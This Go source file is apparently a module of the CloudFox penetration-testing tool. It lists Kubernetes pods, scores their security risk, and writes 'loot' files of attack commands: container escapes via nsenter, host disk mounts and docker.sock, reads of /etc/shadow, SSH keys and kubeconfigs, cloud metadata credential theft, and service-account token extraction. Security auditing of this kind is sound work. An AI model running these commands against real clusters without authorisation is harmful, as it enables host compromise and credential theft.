package commands

import (
	"context"
	"fmt"
	"os"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

var PodsCmd = &cobra.Command{
	Use:     "pods",
	Aliases: []string{},
	Short:   "List all cluster pods with security analysis",
	Long: `
List all cluster pods with comprehensive security analysis including:
- Container escape vectors and privilege escalation paths
- Sensitive host path mounts and their security implications
- Dangerous Linux capabilities that enable container breakouts
- Risk-based scoring for prioritized security review
  cloudfox kubernetes pods`,
	Run: ListPods,
}

type PodsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t PodsOutput) TableFiles() []internal.TableFile {
	return t.Table
}

func (t PodsOutput) LootFiles() []internal.LootFile {
	return t.Loot
}

type PodFinding struct {
	Namespace          string
	Name               string
	PodIP              string
	ServiceAccount     string
	Node               string
	RiskLevel          string
	Privileged         bool
	HostPID            bool
	HostIPC            bool
	HostNetwork        bool
	HostPaths          []string
	SensitiveHostPaths []string
	WritableHostPaths  int
	RunAsRoot          bool
	AllowPrivEsc       bool
	DangerousCaps      []string
	Capabilities       []string
	Images             []string
	ImageTagTypes      []string
	Labels             map[string]string
	Affinity           string
	Tolerations        []string
	Annotations        map[string]string
	CloudProvider      string
	CloudRole          string
}

func ListPods(cmd *cobra.Command, args []string) {
	ctx := context.Background()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating cluster pods for %s", globals.ClusterName), globals.K8S_PODS_MODULE_NAME)

	clientset := config.GetClientOrExit()

	namespaces, err := clientset.CoreV1().Namespaces().List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing namespaces: %v", err), globals.K8S_PODS_MODULE_NAME)
		return
	}

	headers := []string{
		"Risk", "Namespace", "Pod Name", "Pod IP", "Service Account", "Node",
		"HostPID", "HostIPC", "HostNetwork", "Privileged", "HostPaths",
		"RunAsUser", "Capabilities", "Image", "ImageTagType", "Labels",
		"Affinity", "Tolerations", "Annotations",
		"Cloud Provider", "Cloud Role",
	}

	var outputRows [][]string
	var findings []PodFinding

	// Risk level counters
	riskCounts := map[string]int{
		"CRITICAL": 0,
		"HIGH":     0,
		"MEDIUM":   0,
		"LOW":      0,
	}

	// Namespace-organized loot
	namespaceLootExec := map[string][]string{}
	namespaceLootEnum := map[string][]string{}
	var lootPrivEsc []string
	var lootContainerEscape []string
	var lootHostCompromise []string

	lootPrivEsc = append(lootPrivEsc, `#####################################
##### Pod Privilege Escalation
#####################################
#
# MANUAL EXECUTION REQUIRED
# Pods with security misconfigurations
# that can be leveraged for privilege escalation
#
`)

	lootContainerEscape = append(lootContainerEscape, `#####################################
##### Container Escape Techniques
#####################################
#
# MANUAL EXECUTION REQUIRED
# Detailed container escape vectors for high-risk pods
# Organized by escape method and risk level
#
`)

	lootHostCompromise = append(lootHostCompromise, `#####################################
##### Host Compromise Paths
#####################################
#
# MANUAL EXECUTION REQUIRED
# Techniques to compromise the underlying host node
# from privileged or misconfigured pods
#
`)

	for _, ns := range namespaces.Items {
		pods, err := clientset.CoreV1().Pods(ns.Name).List(ctx, metav1.ListOptions{})
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error listing pods in namespace %s: %v\n", ns.Name, err)
			continue
		}

		for _, pod := range pods.Items {
			finding := PodFinding{
				Namespace:      pod.Namespace,
				Name:           pod.Name,
				PodIP:          pod.Status.PodIP,
				ServiceAccount: pod.Spec.ServiceAccountName,
				Node:           pod.Spec.NodeName,
				HostPID:        pod.Spec.HostPID,
				HostIPC:        pod.Spec.HostIPC,
				HostNetwork:    pod.Spec.HostNetwork,
				Labels:         pod.Labels,
				Annotations:    pod.Annotations,
			}

			privileged := false
			runAsUser := -1 // -1 means unset
			var capabilities []string
			var dangerousCaps []string
			allowPrivEsc := false

			for _, container := range append(pod.Spec.InitContainers, pod.Spec.Containers...) {
				// Security context analysis
				if container.SecurityContext != nil {
					if container.SecurityContext.Privileged != nil && *container.SecurityContext.Privileged {
						privileged = true
					}
					if container.SecurityContext.RunAsUser != nil {
						runAsUser = int(*container.SecurityContext.RunAsUser)
					}
					if container.SecurityContext.AllowPrivilegeEscalation != nil {
						if *container.SecurityContext.AllowPrivilegeEscalation {
							allowPrivEsc = true
						}
					} else {
						// Default is true if not specified
						allowPrivEsc = true
					}

					// Capability analysis
					if container.SecurityContext.Capabilities != nil {
						for _, cap := range container.SecurityContext.Capabilities.Add {
							capStr := string(cap)
							capabilities = append(capabilities, capStr)
							// Use helper function to detect dangerous capabilities
							if k8sinternal.IsDangerousCapability(capStr) {
								dangerousCaps = append(dangerousCaps, capStr)
							}
						}
						for _, cap := range container.SecurityContext.Capabilities.Drop {
							capabilities = append(capabilities, "-"+string(cap))
						}
					}
				}

				// Image info
				finding.Images = append(finding.Images, container.Image)
				finding.ImageTagTypes = append(finding.ImageTagTypes, k8sinternal.ImageTagType(container.Image))
			}

			finding.Privileged = privileged
			finding.RunAsRoot = (runAsUser == 0 || runAsUser == -1) // unset defaults to root in many cases
			finding.AllowPrivEsc = allowPrivEsc
			finding.Capabilities = capabilities
			finding.DangerousCaps = dangerousCaps

			// Affinity
			if pod.Spec.Affinity != nil {
				finding.Affinity = fmt.Sprintf("%+v", *pod.Spec.Affinity)
			}

			// Tolerations
			if len(pod.Spec.Tolerations) > 0 {
				for _, t := range pod.Spec.Tolerations {
					finding.Tolerations = append(finding.Tolerations,
						fmt.Sprintf("Key=%s,Operator=%s,Value=%s,Effect=%s", t.Key, string(t.Operator), t.Value, string(t.Effect)))
				}
			}

			// HostPaths analysis using helper function
			hostPathCount := 0
			writableHostPaths := 0
			var hostPathLines []string
			var sensitiveHostPaths []string

			for _, volume := range pod.Spec.Volumes {
				if volume.HostPath != nil {
					hostPathCount++
					mountPoint := k8sinternal.FindMountPath(volume.Name, pod.Spec.Containers)

					// Determine if readonly
					readOnly := false
					for _, container := range pod.Spec.Containers {
						for _, vm := range container.VolumeMounts {
							if vm.Name == volume.Name {
								readOnly = vm.ReadOnly
								break
							}
						}
					}

					if !readOnly {
						writableHostPaths++
					}

					// Use helper function to analyze host path
					isSensitive, description := k8sinternal.AnalyzeHostPath(volume.HostPath.Path, readOnly)

					hostPathLine := fmt.Sprintf("%s:%s", volume.HostPath.Path, mountPoint)
					if readOnly {
						hostPathLine += " (ro)"
					} else {
						hostPathLine += " (rw)"
					}

					if isSensitive {
						hostPathLine += fmt.Sprintf(" - %s", description)
						sensitiveHostPaths = append(sensitiveHostPaths, fmt.Sprintf("%s - %s", volume.HostPath.Path, description))
					}

					hostPathLines = append(hostPathLines, hostPathLine)
					finding.HostPaths = append(finding.HostPaths, hostPathLine)
				}
			}
			finding.SensitiveHostPaths = sensitiveHostPaths
			finding.WritableHostPaths = writableHostPaths

			// Cloud role detection
			roleResults := k8sinternal.DetectCloudRole(ctx, clientset, pod.Namespace, pod.Spec.ServiceAccountName, &pod.Spec, pod.Annotations)
			if len(roleResults) > 0 {
				finding.CloudProvider = roleResults[0].Provider
				finding.CloudRole = roleResults[0].Role
			}

			// Calculate risk level using helper function
			hasDangerousCaps := len(dangerousCaps) > 0
			finding.RiskLevel = k8sinternal.GetPodRiskLevel(
				privileged,
				pod.Spec.HostPID,
				pod.Spec.HostIPC,
				pod.Spec.HostNetwork,
				hostPathCount,
				writableHostPaths,
				finding.RunAsRoot,
				hasDangerousCaps,
				allowPrivEsc,
			)

			riskCounts[finding.RiskLevel]++
			findings = append(findings, finding)

			// Format for table output
			privilegedStr := "false"
			if privileged {
				privilegedStr = "true"
			}

			runAsUserStr := "<unset>"
			if runAsUser == 0 {
				runAsUserStr = "root"
			} else if runAsUser > 0 {
				runAsUserStr = fmt.Sprintf("%d", runAsUser)
			}

			hostPathsStr := "<NONE>"
			if len(hostPathLines) > 0 {
				hostPathsStr = strings.Join(hostPathLines, "\n")
			}

			labelsStr := "<NONE>"
			if len(finding.Labels) > 0 {
				var parts []string
				for k, v := range finding.Labels {
					parts = append(parts, fmt.Sprintf("%s=%s", k, v))
				}
				sort.Strings(parts)
				labelsStr = strings.Join(parts, ",")
			}

			affinityStr := "<NONE>"
			if finding.Affinity != "" {
				affinityStr = finding.Affinity
			}

			tolerationsStr := "<NONE>"
			if len(finding.Tolerations) > 0 {
				tolerationsStr = strings.Join(finding.Tolerations, "; ")
			}

			annotationsStr := "<NONE>"
			if len(finding.Annotations) > 0 {
				var parts []string
				for k, v := range finding.Annotations {
					parts = append(parts, fmt.Sprintf("%s=%s", k, v))
				}
				sort.Strings(parts)
				annotationsStr = strings.Join(parts, ",")
			}

			cloudProviderStr := "<NONE>"
			if finding.CloudProvider != "" {
				cloudProviderStr = finding.CloudProvider
			}

			cloudRoleStr := "<NONE>"
			if finding.CloudRole != "" {
				cloudRoleStr = finding.CloudRole
			}

			row := []string{
				finding.RiskLevel,
				pod.Namespace,
				pod.Name,
				k8sinternal.NonEmpty(pod.Status.PodIP),
				k8sinternal.NonEmpty(pod.Spec.ServiceAccountName),
				k8sinternal.NonEmpty(pod.Spec.NodeName),
				fmt.Sprintf("%v", pod.Spec.HostPID),
				fmt.Sprintf("%v", pod.Spec.HostIPC),
				fmt.Sprintf("%v", pod.Spec.HostNetwork),
				privilegedStr,
				hostPathsStr,
				runAsUserStr,
				strings.Join(capabilities, ","),
				strings.Join(finding.Images, ","),
				strings.Join(finding.ImageTagTypes, ","),
				labelsStr,
				affinityStr,
				tolerationsStr,
				annotationsStr,
				cloudProviderStr,
				cloudRoleStr,
			}
			outputRows = append(outputRows, row)

			// Loot: exec command
			namespaceLootExec[pod.Namespace] = append(namespaceLootExec[pod.Namespace],
				fmt.Sprintf("kubectl exec -it -n %s %s -- sh \n", pod.Namespace, pod.Name),
			)

			// Generate detailed loot based on risk level and findings
			podID := fmt.Sprintf("%s/%s", pod.Namespace, pod.Name)

			// CRITICAL and HIGH risk pods get detailed analysis
			if finding.RiskLevel == "CRITICAL" || finding.RiskLevel == "HIGH" {
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n### [%s] %s", finding.RiskLevel, podID))

				var riskFactors []string
				if privileged {
					riskFactors = append(riskFactors, "PRIVILEGED")
				}
				if pod.Spec.HostPID {
					riskFactors = append(riskFactors, "HOSTPID")
				}
				if pod.Spec.HostIPC {
					riskFactors = append(riskFactors, "HOSTIPC")
				}
				if pod.Spec.HostNetwork {
					riskFactors = append(riskFactors, "HOSTNETWORK")
				}
				if writableHostPaths > 0 {
					riskFactors = append(riskFactors, fmt.Sprintf("WRITABLE_HOSTPATHS:%d", writableHostPaths))
				}
				if len(dangerousCaps) > 0 {
					riskFactors = append(riskFactors, fmt.Sprintf("DANGEROUS_CAPS:%s", strings.Join(dangerousCaps, ",")))
				}

				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("# Risk Factors: %s", strings.Join(riskFactors, ", ")))
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh\n", pod.Namespace, pod.Name))
			}

			// Container Escape Loot - CRITICAL combinations
			if privileged && (pod.Spec.HostPID || pod.Spec.HostNetwork || pod.Spec.HostIPC) {
				lootContainerEscape = append(lootContainerEscape, fmt.Sprintf("\n### [CRITICAL] Privileged + Host Namespaces: %s", podID))
				lootContainerEscape = append(lootContainerEscape, "# This pod has CRITICAL container escape vectors")
				lootContainerEscape = append(lootContainerEscape, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
				lootContainerEscape = append(lootContainerEscape, "")
				lootContainerEscape = append(lootContainerEscape, "# Method 1: nsenter to host PID namespace")
				lootContainerEscape = append(lootContainerEscape, "nsenter --target 1 --mount --uts --ipc --net --pid -- bash")
				lootContainerEscape = append(lootContainerEscape, "")
				lootContainerEscape = append(lootContainerEscape, "# Method 2: Access host filesystem via /proc")
				lootContainerEscape = append(lootContainerEscape, "ls -la /proc/1/root/")
				lootContainerEscape = append(lootContainerEscape, "cat /proc/1/root/etc/shadow")
				lootContainerEscape = append(lootContainerEscape, "")
			} else if privileged {
				lootContainerEscape = append(lootContainerEscape, fmt.Sprintf("\n### [HIGH] Privileged Container: %s", podID))
				lootContainerEscape = append(lootContainerEscape, "# Privileged containers can escape to host")
				lootContainerEscape = append(lootContainerEscape, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
				lootContainerEscape = append(lootContainerEscape, "")
				lootContainerEscape = append(lootContainerEscape, "# Method 1: Mount host disk")
				lootContainerEscape = append(lootContainerEscape, "mkdir /host && mount /dev/sda1 /host && chroot /host")
				lootContainerEscape = append(lootContainerEscape, "")
				lootContainerEscape = append(lootContainerEscape, "# Method 2: Create device and read host filesystem")
				lootContainerEscape = append(lootContainerEscape, "mknod /dev/sda1 b 8 1 && dd if=/dev/sda1 | strings | grep -i password")
				lootContainerEscape = append(lootContainerEscape, "")
			}

			// Host Compromise Loot - Sensitive host paths
			if len(sensitiveHostPaths) > 0 {
				lootHostCompromise = append(lootHostCompromise, fmt.Sprintf("\n### [%s] Sensitive Host Paths: %s", finding.RiskLevel, podID))
				for _, shp := range sensitiveHostPaths {
					lootHostCompromise = append(lootHostCompromise, fmt.Sprintf("# %s", shp))
				}
				lootHostCompromise = append(lootHostCompromise, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
				lootHostCompromise = append(lootHostCompromise, "")

				// Specific techniques for specific paths
				for _, hp := range finding.HostPaths {
					if strings.Contains(hp, "docker.sock") {
						lootHostCompromise = append(lootHostCompromise, "# Docker socket escape:")
						lootHostCompromise = append(lootHostCompromise, "docker -H unix:///var/run/docker.sock ps")
						lootHostCompromise = append(lootHostCompromise, "docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter --target 1 --mount --uts --ipc --net --pid -- bash")
						lootHostCompromise = append(lootHostCompromise, "")
					} else if strings.Contains(hp, "containerd.sock") {
						lootHostCompromise = append(lootHostCompromise, "# Containerd socket escape:")
						lootHostCompromise = append(lootHostCompromise, "ctr -a /run/containerd/containerd.sock namespace ls")
						lootHostCompromise = append(lootHostCompromise, "ctr -a /run/containerd/containerd.sock -n k8s.io container ls")
						lootHostCompromise = append(lootHostCompromise, "")
					} else if strings.Contains(hp, "/etc/kubernetes") {
						lootHostCompromise = append(lootHostCompromise, "# Kubernetes config access:")
						lootHostCompromise = append(lootHostCompromise, "cat /host/etc/kubernetes/admin.conf")
						lootHostCompromise = append(lootHostCompromise, "cat /host/etc/kubernetes/kubelet.conf")
						lootHostCompromise = append(lootHostCompromise, "")
					} else if strings.Contains(hp, "/var/lib/kubelet") {
						lootHostCompromise = append(lootHostCompromise, "# Kubelet data access:")
						lootHostCompromise = append(lootHostCompromise, "find /host/var/lib/kubelet -name '*.crt' -o -name '*.key'")
						lootHostCompromise = append(lootHostCompromise, "cat /host/var/lib/kubelet/kubeconfig")
						lootHostCompromise = append(lootHostCompromise, "")
					} else if strings.HasPrefix(hp, "/:") {
						lootHostCompromise = append(lootHostCompromise, "# Full filesystem access:")
						lootHostCompromise = append(lootHostCompromise, "cat /host/etc/shadow")
						lootHostCompromise = append(lootHostCompromise, "cat /host/root/.ssh/id_rsa")
						lootHostCompromise = append(lootHostCompromise, "")
					}
				}
			}

			// Dangerous capabilities
			if len(dangerousCaps) > 0 {
				lootContainerEscape = append(lootContainerEscape, fmt.Sprintf("\n### [HIGH] Dangerous Capabilities: %s", podID))
				lootContainerEscape = append(lootContainerEscape, fmt.Sprintf("# Capabilities: %s", strings.Join(dangerousCaps, ", ")))
				lootContainerEscape = append(lootContainerEscape, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
				lootContainerEscape = append(lootContainerEscape, "")

				for _, cap := range dangerousCaps {
					switch cap {
					case "SYS_ADMIN":
						lootContainerEscape = append(lootContainerEscape, "# CAP_SYS_ADMIN exploitation:")
						lootContainerEscape = append(lootContainerEscape, "# Can mount filesystems, use unshare, pivot_root")
						lootContainerEscape = append(lootContainerEscape, "mkdir /tmp/cgroup && mount -t cgroup -o rdma cgroup /tmp/cgroup")
						lootContainerEscape = append(lootContainerEscape, "# Or exploit release_agent for code execution")
						lootContainerEscape = append(lootContainerEscape, "")
					case "SYS_PTRACE":
						lootContainerEscape = append(lootContainerEscape, "# CAP_SYS_PTRACE exploitation:")
						lootContainerEscape = append(lootContainerEscape, "# Can attach to processes and inject code")
						lootContainerEscape = append(lootContainerEscape, "gdb -p 1  # Attach to init process")
						lootContainerEscape = append(lootContainerEscape, "")
					case "SYS_MODULE":
						lootContainerEscape = append(lootContainerEscape, "# CAP_SYS_MODULE exploitation:")
						lootContainerEscape = append(lootContainerEscape, "# Can load kernel modules for complete compromise")
						lootContainerEscape = append(lootContainerEscape, "insmod /path/to/malicious.ko")
						lootContainerEscape = append(lootContainerEscape, "")
					case "DAC_READ_SEARCH", "DAC_OVERRIDE":
						lootContainerEscape = append(lootContainerEscape, fmt.Sprintf("# %s exploitation:", cap))
						lootContainerEscape = append(lootContainerEscape, "# Bypass file permissions to read sensitive data")
						lootContainerEscape = append(lootContainerEscape, "")
					case "NET_ADMIN":
						lootContainerEscape = append(lootContainerEscape, "# CAP_NET_ADMIN exploitation:")
						lootContainerEscape = append(lootContainerEscape, "# Can manipulate network, sniff traffic")
						lootContainerEscape = append(lootContainerEscape, "tcpdump -i any -w /tmp/capture.pcap")
						lootContainerEscape = append(lootContainerEscape, "")
					}
				}
			}

			// Host network namespace
			if pod.Spec.HostNetwork {
				lootHostCompromise = append(lootHostCompromise, fmt.Sprintf("\n### [HIGH] Host Network Namespace: %s", podID))
				lootHostCompromise = append(lootHostCompromise, "# Pod uses host network - can sniff host traffic and access host services")
				lootHostCompromise = append(lootHostCompromise, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
				lootHostCompromise = append(lootHostCompromise, "")
				lootHostCompromise = append(lootHostCompromise, "# Sniff host network traffic:")
				lootHostCompromise = append(lootHostCompromise, "tcpdump -i any -w /tmp/host-traffic.pcap")
				lootHostCompromise = append(lootHostCompromise, "")
				lootHostCompromise = append(lootHostCompromise, "# Access host services on localhost:")
				lootHostCompromise = append(lootHostCompromise, "curl http://localhost:10250/pods  # Kubelet API")
				lootHostCompromise = append(lootHostCompromise, "")
			}

			// Host PID namespace
			if pod.Spec.HostPID {
				lootHostCompromise = append(lootHostCompromise, fmt.Sprintf("\n### [HIGH] Host PID Namespace: %s", podID))
				lootHostCompromise = append(lootHostCompromise, "# Pod can see and interact with host processes")
				lootHostCompromise = append(lootHostCompromise, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
				lootHostCompromise = append(lootHostCompromise, "")
				lootHostCompromise = append(lootHostCompromise, "# View host processes:")
				lootHostCompromise = append(lootHostCompromise, "ps auxf  # Shows full host process tree")
				lootHostCompromise = append(lootHostCompromise, "")
				lootHostCompromise = append(lootHostCompromise, "# Access host filesystem via /proc:")
				lootHostCompromise = append(lootHostCompromise, "ls -la /proc/1/root/")
				lootHostCompromise = append(lootHostCompromise, "cat /proc/1/environ  # Host init environment variables")
				lootHostCompromise = append(lootHostCompromise, "")
			}

			// Cloud role access
			if finding.CloudProvider != "" && finding.CloudRole != "" {
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n### [%s] Cloud Role Access: %s", finding.RiskLevel, podID))
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("# Provider: %s, Role: %s", finding.CloudProvider, finding.CloudRole))
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
				lootPrivEsc = append(lootPrivEsc, "")

				switch finding.CloudProvider {
				case "AWS":
					lootPrivEsc = append(lootPrivEsc, "# AWS IAM role enumeration:")
					lootPrivEsc = append(lootPrivEsc, "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/")
					lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("curl http://169.254.169.254/latest/meta-data/iam/security-credentials/%s", finding.CloudRole))
					lootPrivEsc = append(lootPrivEsc, "# Export credentials and enumerate permissions:")
					lootPrivEsc = append(lootPrivEsc, "export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...")
					lootPrivEsc = append(lootPrivEsc, "aws sts get-caller-identity")
					lootPrivEsc = append(lootPrivEsc, "aws iam list-attached-role-policies --role-name $(aws sts get-caller-identity --query Arn --output text | cut -d'/' -f2)")
					lootPrivEsc = append(lootPrivEsc, "")
				case "GCP":
					lootPrivEsc = append(lootPrivEsc, "# GCP service account enumeration:")
					lootPrivEsc = append(lootPrivEsc, "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email")
					lootPrivEsc = append(lootPrivEsc, "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
					lootPrivEsc = append(lootPrivEsc, "# Use gcloud if available:")
					lootPrivEsc = append(lootPrivEsc, "gcloud auth list")
					lootPrivEsc = append(lootPrivEsc, "gcloud projects list")
					lootPrivEsc = append(lootPrivEsc, "")
				case "Azure":
					lootPrivEsc = append(lootPrivEsc, "# Azure managed identity enumeration:")
					lootPrivEsc = append(lootPrivEsc, "curl -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'")
					lootPrivEsc = append(lootPrivEsc, "# Use Azure CLI if available:")
					lootPrivEsc = append(lootPrivEsc, "az account show")
					lootPrivEsc = append(lootPrivEsc, "az role assignment list")
					lootPrivEsc = append(lootPrivEsc, "")
				}
			}

			// Non-default ServiceAccount
			if finding.ServiceAccount != "" && finding.ServiceAccount != "default" {
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("\n### [%s] Non-default ServiceAccount: %s (SA: %s)", finding.RiskLevel, podID, finding.ServiceAccount))
				lootPrivEsc = append(lootPrivEsc, "# Extract and test ServiceAccount token:")
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -n %s %s -- cat /var/run/secrets/kubernetes.io/serviceaccount/token", pod.Namespace, pod.Name))
				lootPrivEsc = append(lootPrivEsc, "# Test permissions:")
				lootPrivEsc = append(lootPrivEsc, fmt.Sprintf("kubectl exec -it -n %s %s -- sh", pod.Namespace, pod.Name))
				lootPrivEsc = append(lootPrivEsc, "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)")
				lootPrivEsc = append(lootPrivEsc, "kubectl --token=$TOKEN auth can-i --list")
				lootPrivEsc = append(lootPrivEsc, "")
			}

			// Loot: describe + jq
			jqCmd := fmt.Sprintf(
				`kubectl get pod -n %s %s -o json | jq '{
Namespace: .metadata.namespace,
Name: .metadata.name,
PodIP: .status.podIP,
ServiceAccountName: .spec.serviceAccountName,
NodeName: .spec.nodeName,
HostPID: .spec.hostPID,
HostIPC: .spec.hostIPC,
HostNetwork: .spec.hostNetwork,
Privileged: ([.spec.initContainers[], .spec.containers[]]
    | map(.securityContext.privileged // false) | any),
HostPaths: ([.spec.volumes[]? | select(.hostPath)
    | {(.hostPath.path): .name}]),
RunAsUser: ([.spec.initContainers[], .spec.containers[]]
    | map(.securityContext.runAsUser // empty)
    | map(select(. != null)) | unique),
Capabilities: ([.spec.initContainers[], .spec.containers[]]
    | map(.securityContext.capabilities.add // [])
    | add? // [] | unique),
Images: ([.spec.initContainers[], .spec.containers[]]
    | map(.image) | unique),
ImageTagType: ([.spec.initContainers[], .spec.containers[]]
    | map(if (.image | contains(":")) then "Tagged" else "Latest" end)
    | unique),
Labels: (.metadata.labels // {}),
Affinity: (.spec.affinity // {}),
Tolerations: (.spec.tolerations // []),
Annotations: (.metadata.annotations // {})
}'`, pod.Namespace, pod.Name)
			namespaceLootEnum[pod.Namespace] = append(namespaceLootEnum[pod.Namespace],
				fmt.Sprintf("kubectl describe pod -n %s %s", pod.Namespace, pod.Name),
				jqCmd,
			)
		}
	}

	// Build lootExec with namespace headers
	lootExec := []string{
		"#####################################",
		"##### Execute into running Kubernetes Pods",
		"#####################################",
		"",
	}
	if globals.KubeContext != "" {
		lootExec = append(lootExec, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	nsList := make([]string, 0, len(namespaceLootExec))
	for ns := range namespaceLootExec {
		nsList = append(nsList, ns)
	}
	sort.Strings(nsList)
	for i, ns := range nsList {
		lootExec = append(lootExec, fmt.Sprintf("\n# Namespace: %s\n", ns))
		lootExec = append(lootExec, namespaceLootExec[ns]...)
		if i < len(nsList)-1 {
			lootExec = append(lootExec, "")
		}
	}

	// Build lootEnum with namespace headers
	lootEnum := []string{
		"#####################################",
		"##### Enumerate Pod Information",
		"#####################################",
		"",
	}
	if globals.KubeContext != "" {
		lootEnum = append(lootEnum, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	nsListEnum := make([]string, 0, len(namespaceLootEnum))
	for ns := range namespaceLootEnum {
		nsListEnum = append(nsListEnum, ns)
	}
	sort.Strings(nsListEnum)
	for i, ns := range nsListEnum {
		lootEnum = append(lootEnum, fmt.Sprintf("\n# Namespace: %s\n", ns))
		lootEnum = append(lootEnum, namespaceLootEnum[ns]...)
		if i < len(nsListEnum)-1 {
			lootEnum = append(lootEnum, "")
		}
	}

	// Add summaries to loot files
	if riskCounts["CRITICAL"] > 0 || riskCounts["HIGH"] > 0 {
		summary := fmt.Sprintf(`
# SUMMARY: Risk Distribution
# CRITICAL: %d pods
# HIGH: %d pods
# MEDIUM: %d pods
# LOW: %d pods
#
# Focus on CRITICAL and HIGH risk pods first for maximum impact.
# See detailed exploitation techniques below:
`, riskCounts["CRITICAL"], riskCounts["HIGH"], riskCounts["MEDIUM"], riskCounts["LOW"])

		lootPrivEsc = append([]string{summary}, lootPrivEsc...)
		lootContainerEscape = append([]string{summary}, lootContainerEscape...)
		lootHostCompromise = append([]string{summary}, lootHostCompromise...)
	} else {
		noRiskMsg := "\n# No CRITICAL or HIGH risk pods found.\n# Review MEDIUM risk pods manually for potential issues.\n"
		lootPrivEsc = append(lootPrivEsc, noRiskMsg)
		lootContainerEscape = append(lootContainerEscape, noRiskMsg)
		lootHostCompromise = append(lootHostCompromise, noRiskMsg)
	}

	table := internal.TableFile{
		Name:   "Pods",
		Header: headers,
		Body:   outputRows,
	}

	lootExecute := internal.LootFile{
		Name:     "Pods-Execution",
		Contents: strings.Join(lootExec, "\n"),
	}

	lootDescribe := internal.LootFile{
		Name:     "Pods-Enum",
		Contents: strings.Join(lootEnum, "\n"),
	}

	lootPrivEscalation := internal.LootFile{
		Name:     "Pods-Privilege-Escalation",
		Contents: strings.Join(lootPrivEsc, "\n"),
	}

	lootEscape := internal.LootFile{
		Name:     "Pods-Container-Escape",
		Contents: strings.Join(lootContainerEscape, "\n"),
	}

	lootCompromise := internal.LootFile{
		Name:     "Pods-Host-Compromise",
		Contents: strings.Join(lootHostCompromise, "\n"),
	}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Pods",
		globals.ClusterName,
		"results",
		PodsOutput{
			Table: []internal.TableFile{table},
			Loot:  []internal.LootFile{lootExecute, lootDescribe, lootPrivEscalation, lootEscape, lootCompromise},
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_PODS_MODULE_NAME)
		return
	}

	if len(outputRows) > 0 {
		logger.InfoM(fmt.Sprintf("%d pods found across %d namespaces | Risk: CRITICAL=%d, HIGH=%d, MEDIUM=%d, LOW=%d",
			len(outputRows), len(namespaces.Items),
			riskCounts["CRITICAL"], riskCounts["HIGH"], riskCounts["MEDIUM"], riskCounts["LOW"]),
			globals.K8S_PODS_MODULE_NAME)
	} else {
		logger.InfoM("No pods found, skipping output file creation", globals.K8S_PODS_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_PODS_MODULE_NAME), globals.K8S_PODS_MODULE_NAME)
}
